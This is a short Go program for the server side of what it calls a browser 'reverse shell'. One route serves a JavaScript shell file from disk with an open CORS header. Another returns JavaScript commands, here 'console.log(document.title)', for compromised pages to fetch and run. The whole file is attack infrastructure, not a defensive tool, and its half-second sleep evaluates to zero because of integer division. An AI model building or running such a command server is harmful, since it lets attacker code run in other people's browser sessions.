package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

func cmdHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("recieved req")
	time.Sleep(1 / 2 * time.Second)
	enableCors(&w)
	fmt.Fprint(w, "console.log(document.title)")
}

func enableCors(w *http.ResponseWriter) {
	(*w).Header().Set("Access-Control-Allow-Origin", "*")
}

func getHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("initialization of reverse shell")

	file, err := os.ReadFile("../js/rev-shell.js")

	if err != nil {
		log.Fatal("could not open file", err)
	}
	script := string(file)

	enableCors(&w)
	fmt.Fprint(w, script)
}

func main() {
	http.HandleFunc("/get", getHandler)
	http.HandleFunc("/", cmdHandler)

	port := ":8080"

	fmt.Println("listening on port", port)
	http.ListenAndServe(port, nil)
}
